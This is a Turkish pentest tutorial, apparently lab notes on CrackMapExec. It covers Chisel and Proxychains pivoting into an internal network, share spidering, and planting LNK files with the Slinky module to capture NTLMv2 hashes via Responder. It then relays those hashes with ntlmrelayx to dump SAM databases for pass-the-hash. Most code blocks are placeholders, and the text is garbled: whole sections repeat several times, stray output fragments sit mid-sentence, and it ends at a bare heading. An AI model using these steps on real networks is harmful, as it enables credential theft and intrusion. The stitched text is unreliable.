{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

